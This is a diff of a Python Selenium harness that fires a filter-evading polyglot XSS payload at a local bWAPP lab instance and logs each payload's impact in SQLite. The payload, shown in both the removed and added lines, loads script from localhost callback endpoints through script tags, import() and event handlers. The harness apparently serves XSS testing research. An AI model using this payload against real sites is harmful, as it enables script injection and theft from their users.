@@ -3,10 +3,11 @@ from typing import Callable
 from bs4 import BeautifulSoup
 from deepdiff import DeepDiff
 from seleniumwire import webdriver
+import sqlite3
 
 from bwapp_selenium_actions import *
 
-URL = "http://127.0.0.1:4040/bWAPP/"
+URL = "http://127.0.0.1:4040/"
 
 def print_diff(diff: DeepDiff):
     print(diff.keys())
@@ -56,16 +57,27 @@ def single_experiment(driver: webdriver, payloads: list[str], experiment_functio
 
     # generate diffs for each payload and compare to the expected diff, save differences
     for payload in payloads:
+        db = sqlite3.connect("instance/flaskr.sqlite", timeout=10)
+        db.execute("INSERT INTO xss (payload, attacked_path) VALUES (?, ?)",
+                    (payload, experiment_function.__name__))
+        db.commit()
+        cur = db.execute("SELECT id, payload, attacked_path FROM xss WHERE payload == ? AND attacked_path == ?", (payload, experiment_function.__name__))
+        experiment_id = cur.fetchone()[0]
+        payload = payload.replace("<id>", str(experiment_id))
+        print(payload)
         html_payload = experiment_function(driver, URL, payload)
         soup_payload = BeautifulSoup(html_payload, "html.parser")
         diff_payload = DeepDiff(soup_uuid_1, soup_payload)
         results[payload] = compare_diffs(diff_payload, expected_diff)
+        db.execute("UPDATE xss SET impact = ? WHERE id = ?", (str(results[payload]), experiment_id))
+        db.commit()
         print(results[payload])
+        db.close()
 
     driver.quit()
 
-payloads = ["\"<ScRiPt sRc=`http://localhost:9090`></ScRiPt>nOeMbed><ScRiPt sRc='http://localhost:9090'></ScRiPt>\"&gt;import(`http://localhost:9090`) <!--hTmL>' oNLoAd= )texTarEa&gt;<iMg-<ScRiPt sRc=`http://localhost:9090`></ScRiPt> oNFoCus=*/';/ifRaMe>hTmL> oNtOgGle=/*`>/sOurCe&gt; oNmOuSeLeaVe= > OnBlUr= <ScRiPt sRc='http://localhost:9090'></ScRiPt>iMg/* onClICk=import(\"http://localhost:9090\")", "sane"]
+payloads = ["\"<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt>nOeMbed><ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>\"&gt;import(`http://localhost:5000/submit/<id>`) <!--hTmL>' oNLoAd= )texTarEa&gt;<iMg-<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt> oNFoCus=*/';/ifRaMe>hTmL> oNtOgGle=/*`>/sOurCe&gt; oNmOuSeLeaVe= > OnBlUr= <ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>iMg/* onClICk=import(\"http://localhost:5000/submit/<id>\")", "sane"]
 
 if __name__ == '__main__':
     driver = webdriver.Chrome()
-    single_experiment(driver, payloads, xss_stored_blog)
+    single_experiment(driver, payloads, xss_reflected_eval)
